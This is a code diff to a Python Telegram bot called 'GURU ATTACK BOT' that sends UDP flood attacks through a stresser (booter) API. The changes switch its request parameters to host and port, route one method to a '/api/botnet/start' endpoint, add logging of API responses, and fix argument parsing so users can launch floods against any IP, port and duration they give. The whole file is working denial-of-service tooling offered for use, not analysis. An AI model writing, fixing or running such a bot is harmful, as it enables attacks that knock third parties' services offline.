@@ -31,7 +31,7 @@ OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 
 MIN_DURATION = 60
-MAX_DURATION = 200
+MAX_DURATION = 80
 RATE_LIMIT_SECONDS = 10
 
 # ===== ATTACK METHODS =====
@@ -44,7 +44,7 @@ METHOD_CONCURRENT = {
 
 METHOD_ENDPOINT = {
     "UDP-BIG": "/api/start",
-    "UDP-Gbps": "/api/bota/start",
+    "UDP-Gbps": "/api/botnet/start",
 }
 
 logging.basicConfig(
@@ -605,6 +605,7 @@ init_pseudo_owner()
 
 # ===== API FUNCTIONS =====
 async def send_api_attack(target, port, duration, method):
+    """Call stresser.works API. Uses host/port params."""
     if not API_TOKEN:
         return {"success": False, "error": "API_TOKEN missing"}
 
@@ -613,14 +614,17 @@ async def send_api_attack(target, port, duration, method):
         return {"success": False, "error": f"Unknown method {method}"}
 
     url = API_BASE.rstrip('/') + endpoint
+
     params = {
         "token": API_TOKEN,
-        "R": target,
-        "O": str(port),
+        "host": target,
+        "port": str(port),
         "time": str(duration),
         "method": method,
-        "geolocation": "ALL",
     }
+    if method == "UDP-BIG":
+        params["geolocation"] = "ALL"
+
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "application/json, text/plain, */*",
@@ -630,6 +634,7 @@ async def send_api_attack(target, port, duration, method):
     conc = METHOD_CONCURRENT.get(method, 1)
 
     logger.info(f"🚀 {method} → {target}:{port} for {duration}s ({conc}c)")
+    logger.info(f"🔗 URL: {url}")
 
     try:
         async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
@@ -637,6 +642,8 @@ async def send_api_attack(target, port, duration, method):
             async with session.get(url, params=params) as resp:
                 elapsed = time.time() - start
                 text = await resp.text(encoding='utf-8', errors='ignore')
+                logger.info(f"📊 API Response: {resp.status} in {elapsed:.2f}s — {text[:200]}")
+
                 try:
                     data = json.loads(text)
                 except Exception:
@@ -647,6 +654,7 @@ async def send_api_attack(target, port, duration, method):
                     or data.get('success') is True
                     or 'started' in str(data).lower()
                     or 'attack' in str(data).lower()
+                    or 'sent' in str(data).lower()
                 )
 
                 return {
@@ -655,7 +663,7 @@ async def send_api_attack(target, port, duration, method):
                     "elapsed": elapsed,
                     "response": data,
                     "attack_id": data.get('attack_id') or data.get('id') or 'N/A',
-                    "error": None if ok else data.get('message', f"HTTP {resp.status}"),
+                    "error": None if ok else data.get('message', f"HTTP {resp.status} — {text[:120]}"),
                     "concurrent": conc,
                 }
     except asyncio.TimeoutError:
@@ -826,7 +834,7 @@ class AttackManager:
                     parse_mode='Markdown',
                 )
             except Exception as e:
-                logger.error(f"Admin alert failed: {e}")
+                logger.error(f"Admin alert failed for {admin['user_id']}: {e}")
 
     async def stop_attack(self, user_id, attack_id=None):
         async with self.lock:
@@ -1010,14 +1018,14 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     method = "UDP-BIG"
     host = "1.1.1.1"
     port = 80
-    if args and len(args) >= 3:
+    if args and len(args) >= 2:
         host = args[0]
         try:
             port = int(args[1])
         except ValueError:
             port = 80
-        if len(args) > 3 and args[3].upper() in ATTACK_METHODS:
-            method = args[3].upper()
+        if len(args) > 2 and args[2].upper() in ATTACK_METHODS:
+            method = args[2].upper()
 
     msg = await update.message.reply_text(
         f"🔬 Testing `{method}` on `{host}:{port}`…",
@@ -1026,7 +1034,8 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     r = await send_api_attack(host, port, 10, method)
     if r.get("success"):
         await msg.edit_text(
-            f"✅ API OK\n"
+            f"✅ API OK\n\n"
+            f"Method: `{method}`\n"
             f"Status: `{r.get('status')}` | {r.get('elapsed', 0):.2f}s\n"
             f"Attack ID: `{r.get('attack_id')}`\n"
             f"Raw: `{str(r.get('response'))[:150]}`",
@@ -1034,8 +1043,10 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     else:
         await msg.edit_text(
-            f"❌ API FAILED\nError: `{r.get('error')}`\n"
-            f"Raw: `{str(r.get('response'))[:150]}`",
+            f"❌ API FAILED\n\n"
+            f"Method: `{method}`\n"
+            f"Error: `{r.get('error')}`\n"
+            f"Raw: `{str(r.get('response'))[:200]}`",
             parse_mode='Markdown',
         )
 
@@ -1161,7 +1172,7 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.edit_message_text(
         "💥 *Select method*\n\n"
         "• **UDP-BIG** — normal (4 concurrent)\n"
-        "• **UDP-Gbps** — bota (2 concurrent)\n\n"
+        "• **UDP-Gbps** — botnet (2 concurrent)\n\n"
         "After selecting, send: `IP PORT TIME`",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown',
@@ -1891,11 +1902,12 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     r = await send_api_attack("1.1.1.1", 80, 10, "UDP-BIG")
     if r.get("success"):
-        text = (f"✅ API OK\n"
+        text = (f"✅ API OK\n\n"
                 f"Status: `{r.get('status')}` | {r.get('elapsed', 0):.2f}s\n"
-                f"Attack ID: `{r.get('attack_id')}`")
+                f"Attack ID: `{r.get('attack_id')}`\n"
+                f"Raw: `{str(r.get('response'))[:150]}`")
     else:
-        text = (f"❌ API FAILED\n"
+        text = (f"❌ API FAILED\n\n"
                 f"Error: `{r.get('error')}`\n"
                 f"Raw: `{str(r.get('response'))[:150]}`")
     await query.edit_message_text(
@@ -1967,11 +1979,11 @@ def main():
         print("⚠️ API_TOKEN not set — attacks will fail.")
 
     print("=" * 60)
-    print("🔥 GURU ATTACK BOT — UDP.works API")
+    print("🔥 GURU ATTACK BOT — stresser.works API")
     print("=" * 60)
     print("Methods:")
-    print("  UDP-BIG   → /api/start       (4 concurrent)")
-    print("  UDP-Gbps  → /api/bota/start  (2 concurrent)")
+    print("  UDP-BIG   → /api/start         (4 concurrent)")
+    print("  UDP-Gbps  → /api/botnet/start  (2 concurrent)")
     print("=" * 60)
 
     bot_app = Application.builder().token(TELEGRAM_TOKEN).build()
